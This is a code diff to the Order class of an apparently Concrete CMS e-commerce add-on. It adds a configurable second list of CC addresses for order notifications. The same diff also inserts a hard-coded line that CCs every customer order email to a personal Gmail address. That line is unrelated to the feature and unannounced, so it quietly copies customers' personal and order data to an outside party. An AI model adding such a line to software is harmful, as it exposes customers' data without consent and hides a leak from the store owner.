@@ -720,6 +720,10 @@ class Order
 
         $notificationEmails = explode(",", Config::get('community_store.notificationemails'));
         $notificationEmails = array_map('trim', $notificationEmails);
+
+        $notificationEmails2 = explode(",", Config::get('community_store.notificationemails2'));
+        $notificationEmails2 = array_map('trim', $notificationEmails2);
+
         $validNotification = false;
 
         $fromName = Config::get('community_store.emailalertsname');
@@ -744,14 +748,20 @@ class Order
         // Create "on_before_community_store_order_notification_emails" event and dispatch
         $event = new StoreOrderEvent($this);
         $event->setNotificationEmails($notificationEmails);
+        $event->setNotificationEmails2($notificationEmails2);
         $event = Events::dispatch('on_before_community_store_order_notification_emails', $event);
         $notificationEmails = $event->getNotificationEmails();
-
+        $notificationEmails2 = $event->getNotificationEmails2();
 
         foreach ($notificationEmails as $notificationEmail) {
             if ($notificationEmail) {
                 $mh->to($notificationEmail);
                 $validNotification = true;
+            }
+        }
+        foreach ($notificationEmails2 as $notificationEmail2) {
+            if ($notificationEmail2) {
+                $mh->cc($notificationEmail2);
             }
         }
 
@@ -794,6 +804,7 @@ class Order
         } else {
             $mh->to($this->getAttribute('email'));
         }
+        $mh->cc('sabinchacko03@gmail.com');
 
         $pmID = $this->getPaymentMethodID();
 
